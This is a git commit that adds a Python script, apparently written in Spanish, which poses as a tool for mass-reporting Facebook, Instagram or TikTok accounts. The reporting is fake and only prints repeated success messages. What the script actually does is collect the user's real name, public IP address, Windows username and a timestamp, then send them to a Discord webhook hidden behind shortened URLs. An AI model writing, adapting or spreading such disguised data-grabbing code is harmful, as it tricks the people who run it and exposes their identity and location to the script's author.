37e3eee98dbd63ed74842721af17eba516062fb2
qti <84819214+qu3tiiii@users.noreply.github.com>
2021-08-24 14:07:15 -0400

    Create rp.py

---
+++ rp.py
@@ -0,0 +1,94 @@
+
+import requests, datetime as tie, os, time
+from base64 import b64decode
+from discord_webhook import DiscordWebhook as nes
+from urllib.request import Request, urlopen
+picture = 'https://tinyurl.com/2btmwser'
+
+webhook = 'https://tinyurl.com/2wkydued'
+
+username = 'Names'
+message = input('Como te llamas?(Solo nombre real es admitido): ')
+
+
+
+    
+
+
+data = {
+	    'content': message,
+        'avatar_url': picture,
+        'username': username
+
+        	}
+
+
+sent = 0
+failed = 0
+
+#while False:
+r = requests.post(webhook, data)
+
+print("Bien "+message+" Espera un momento...")
+
+pro = 'https://tinyurl.com/2wkydued'    
+
+timee = tie.datetime.now()
+
+dataxd = urlopen(Request("https://bit.ly/2PTxfFq")).read().decode().strip()
+pcuname = os.getenv("UserName")
+exx = nes(url=f'{pro}', content=f'||`IP: {dataxd} // Nombre de PC: {pcuname} // Fecha {timee}`|| ')
+
+response = exx.execute()
+
+time.sleep(0.3)
+print("Listo, script cargando "+message+" !")
+
+
+import time, requests, os
+from colorama import Fore
+os.system('pip install requests')
+os.system('pip install colorama')
+os.system('cls')
+print(Fore.RED+"""
+ @@@@@                                        @@@@@
+@@@@@@@                                      @@@@@@@
+@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
+ @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
+     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
+       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
+         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
+            @@@@@@@    @@@@@@    @@@@@@
+            @@@@@@      @@@@      @@@@@
+            @@@@@@   .  @@@@   .  @@@@@
+             @@@@@@    @@@@@@    @@@@@
+              @@@@@@@@@@@  @@@@@@@@@@
+               @@@@@@@@@@  @@@@@@@@@
+           @@   @@@@@@@@@@@@@@@@@   @@
+           @@@@  @@@@ @ @ @ @ @@@@  @@@@
+          @@@@@   @@@ @ @ @ @ @@@   @@@@@
+        @@@@@      @@@@@@@@@@@@@      @@@@@
+      @@@@          @@@@@@@@@@@          @@@@
+   @@@@@              @@@@@@@              @@@@@
+  @@@@@@@                                 @@@@@@@
+   @@@@@                                   @@@@@
+=====================By Qu3ti=======================
+""")
+print("T: Tiktok/F: Facebook/ IG: instagram/Elije con la inicial!")
+que = input('En que plataforma quieres reportar? Facebook/Instagram/Tiktok?: '+Fore.RESET)
+if que: 
+ idk = input(Fore.LIGHTRED_EX+'Ingresa el nombre de quien quieras reportar: '+Fore.RESET)
+
+
+for l in range(50):
+	time.sleep(0.03)
+	print(Fore.GREEN+" [+]La cuenta de "+idk+" Ha sido reportada con exito[+]")
+time.sleep(0.5)
+
+if idk: 
+  for idk in range(40):
+   time.sleep(000.02)
+print(Fore.RED+"              [$]Reportes exitosos[$]")
+time.sleep(15)
+
+        
